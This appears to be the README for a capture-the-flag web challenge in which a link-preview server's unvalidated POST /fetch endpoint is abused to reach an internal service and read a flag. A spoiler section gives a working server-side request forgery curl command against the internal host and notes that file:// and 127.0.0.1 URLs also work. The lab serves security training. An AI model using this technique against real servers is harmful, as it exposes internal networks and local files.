# w07 :: Mirror Chrome

- **Category:** Web
- **Difficulty:** medium
- **Stack:** TypeScript / Node (2 containers)
- **URL:** http://localhost:30007

## Brief

MIRROR CHROME is a link preview renderer: you hand it a URL, it pulls the page
through "the render farm" and shows you the raw body. The prerender farm is a
separate internal service — it holds the flag and it is **not** published to the
host. The only thing standing between you and it is the parser on the front door.

## Goal

Make the MIRROR CHROME server fetch the internal render farm on your behalf and
read the flag.

## Hint

`POST /fetch` takes a URL and fetches it server-side. Nothing checks *where*
that URL points — no scheme check, no allowlist, no private-range filtering.
The internal farm is a real hostname on the container network.

<details>
<summary>Spoiler</summary>

`GET /api/health` leaks the upstream host (`w0b-w07-internal:9000`). Because
`/fetch` performs an unvalidated server-side request, just ask it for the
internal service's secret path:

```bash
curl -s -X POST http://localhost:30007/fetch \
  -H 'content-type: application/json' -H 'accept: application/json' \
  -d '{"url":"http://w0b-w07-internal:9000/secret"}'
```

`file://` and `http://127.0.0.1` work too. See `solution/writeup.md`.

</details>
